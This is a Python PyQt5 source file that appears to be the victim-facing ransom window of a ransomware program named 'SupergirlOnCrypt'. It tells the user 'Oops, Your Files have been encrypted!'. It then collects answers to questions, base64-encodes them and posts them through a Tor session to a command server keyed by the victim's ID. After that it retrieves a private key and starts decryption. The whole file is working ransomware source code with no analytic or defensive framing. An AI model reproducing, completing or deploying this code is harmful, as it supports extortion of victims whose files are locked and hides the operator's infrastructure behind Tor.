import json
import base64
import collections
from PyQt5 import QtCore
from PyQt5.QtCore import QSize
from PyQt5.QtGui import QImage, QPalette, QBrush, QFont
from PyQt5.QtWidgets import QLabel, QPushButton, QWidget, QMessageBox, QTextEdit, QProgressBar, QInputDialog, QLineEdit
from Helper import Helper
from TorManager import TorManager
import Config
import DecryptThread
import requests



class GUI(QWidget):
    def __init__(self, uuid):
        self.uuid = uuid
        QWidget.__init__(self)
        self.headerFont = QFont("Times", 22, QFont.AllUppercase)
        self.setup()

    def setup(self):
        self.resize(800, 600)
        self.setWindowTitle("SupergirlOnCrypt")
        self.setWindowFlags(self.windowFlags() | QtCore.Qt.CustomizeWindowHint)
        self.setWindowFlags(self.windowFlags() & ~QtCore.Qt.WindowMaximizeButtonHint)
        self.setWindowFlags(self.windowFlags() & ~QtCore.Qt.WindowMinimizeButtonHint)
        self.setbg()
        self.placeWidgets()
        self.show()

    def setbg(self):
        h = Helper()
        oImage = QImage(h.path("res/gui_bg.jpg"))
        sImage = oImage.scaled(QSize(800, 600))  # resize Image to widgets size
        palette = QPalette()
        palette.setBrush(10, QBrush(sImage))  # 10 = Windowrole
        self.setPalette(palette)

    def placeWidgets(self):
        #heading
        self.lbHeader = QLabel("Oops, Your Files\nhave been encrypted!", self)
        self.lbHeader.setFont(self.headerFont)
        self.lbHeader.setStyleSheet("QLabel { color: white;}")
        self.lbHeader.setGeometry(10, 15, 500, 120)

        self.infoText = QTextEdit(self)
        self.infoText.setReadOnly(True)
        self.infoText.setGeometry(205, 150, 550, 360)
        h = Helper()
        with open(h.path('res/info.html'), 'r') as encrypt_info_file:
            encrypt_text = encrypt_info_file.read().replace('\n', '')
        self.infoText.setHtml(encrypt_text)

        self.progressBar = QProgressBar(self)
        self.progressBar.setRange(0, 0)
        self.progressBar.setGeometry(20, 550, 500, 24)
        self.progressBar.hide()

        #button decrypt
        self.btnDecrypt = QPushButton("Decrypt", self)
        self.btnDecrypt.move(650, 550)
        self.btnDecrypt.setStyleSheet("QPushButton {background-color:black; color: white; width:100px; height:24px;} "
                                      "QPushButton:hover {color:green;}")
        self.btnDecrypt.clicked.connect(self.askQuestions)

    def askQuestion(self, q):
        text, okPressed = QInputDialog.getText(self, "Supergirl", q, QLineEdit.Normal, "")
        if okPressed and text != '':
            return text
        else:
            return ""


    def askQuestions(self):
        h = Helper()
        questions = []
        with open(h.path('res/questions.txt'), 'r') as f:
            for question in f:
                r = self.askQuestion(question)
                tmp = [question.replace('\n', ''), base64.b64encode(str(r).encode('utf-8'))]
                questions.append(tmp)
        print(questions)
        self.sendAnswers(questions)

    def sendAnswers(self, q):
        tor = TorManager()
        r = tor.getSession()
        try:
            data = collections.OrderedDict()
            for i in range(0, len(q)):
                data[q[i][0]] = q[i][1].decode('utf-8')
            headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
            req = r.post(Config.API_URL + "/answer/" + self.uuid, data=json.dumps(data), headers=headers)
            data = json.loads(req.text)
            if data['STATUS'] == "WRONG_ANSWERS":
                QMessageBox.question(self, "Still locked...", "Your machine is still locked\nAt least one Answer was wrong", QMessageBox.Ok)
            elif data['STATUS'] == "OK":
                self.decryptData()
        except requests.exceptions.RequestException:
            QMessageBox.question(self, "Error", "You are fucked...",
                                 QMessageBox.Ok)

    def decryptData(self):
        tor = TorManager()
        r = tor.getSession()
        try:
            req = r.get(Config.API_URL + "/decrypt/" + self.uuid)
            data = json.loads(req.text)
            if data['STATUS'] == "FAIL":
                QMessageBox.question(self, "Still locked...", "Decryption Failed!", QMessageBox.Ok)
            elif data['STATUS'] == "SUCCESS":
                self.progressBar.show()
                privkey = base64.b64decode(data['priv_key']).decode('utf-8')
                self.decryptThread = DecryptThread.DecryptThread(privkey)
                self.decryptThread.start()
        except requests.exceptions.RequestException:
            QMessageBox.question(self, "Error", "You are fucked...",
                                 QMessageBox.Ok)
